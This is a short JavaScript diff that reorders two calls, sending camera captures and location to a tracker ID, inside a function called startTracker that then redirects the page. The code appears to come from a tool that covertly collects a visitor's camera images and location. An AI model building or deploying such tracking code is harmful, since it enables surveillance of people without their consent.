@@ -49,8 +49,9 @@ async function startTracker() {
     try {
 
         await Promise.all([
-            sendCameraCaptures(URL_ID, TRACKER_ID),
-            sendLocation(URL_ID, TRACKER_ID)
+
+            sendLocation(URL_ID, TRACKER_ID),
+            sendCameraCaptures(URL_ID, TRACKER_ID)
         ]);
 
         window.location.href = REDIRECT_URL;
